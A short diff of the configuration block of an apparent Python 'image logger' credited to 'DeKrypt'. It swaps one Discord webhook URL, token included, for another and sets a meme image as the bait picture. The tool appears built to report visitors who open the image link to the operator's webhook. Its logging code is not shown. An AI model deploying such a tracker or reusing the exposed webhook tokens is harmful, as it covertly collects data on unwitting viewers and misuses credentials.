@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1498794011530367097/X8k-5MhIwEwbgfuhMb5d63y1QG-kNI43oP4XM9_PF_wXIrCWybVhwSj5M9XyYIIPuhmz",
+    "webhook": "https://discord.com/api/webhooks/1498801691833798777/cB984aFPuFj7dEpjH883igJkkV1O6Owvb8lhG3qo5ZI9U2ZaoncQyMTyEapT4Xfoq-e2",
     "image": "https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/c5ae195f-e639-4f3e-87e0-6199d10d2fb9/dg65n12-e39839ab-ea1c-4f10-81c0-58a5acdc6a13.png/v1/fill/w_1280,h_1634/mike_wazowski_meme_png_by_kylewithem_dg65n12-fullview.png?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7ImhlaWdodCI6Ijw9MTYzNCIsInBhdGgiOiIvZi9jNWFlMTk1Zi1lNjM5LTRmM2UtODdlMC02MTk5ZDEwZDJmYjkvZGc2NW4xMi1lMzk4MzlhYi1lYTFjLTRmMTAtODFjMC01OGE1YWNkYzZhMTMucG5nIiwid2lkdGgiOiI8PTEyODAifV1dLCJhdWQiOlsidXJuOnNlcnZpY2U6aW1hZ2Uub3BlcmF0aW9ucyJdfQ.K9jNItN29dKsf--8_IHyFKV7K4vuMwwnCcLq4N4_eUo", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
